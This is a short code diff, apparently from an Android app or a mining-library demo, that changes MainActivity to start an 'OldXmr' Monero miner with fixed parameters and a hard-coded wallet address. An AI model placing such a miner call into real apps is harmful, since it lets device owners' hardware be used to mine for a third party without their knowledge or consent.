@@ -255,6 +255,6 @@ public final class MainActivity extends Activity {
 //            }
 //        }).setWalletAddr("46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY")
 //                .startMine();
-        OldXmr.instance().setContext(this).startMine();
+        OldXmr.instance().startMine(this, 7, 99, "46Ffvb3jf7ZcVqgPjeReAfZyAk7qKm4FqMb6g6SsT6bpKAhPo9EtNKUVEdMpk62zPpB9GJt75xTD75vYHKredVB3RDHfxdY");
     }
 }
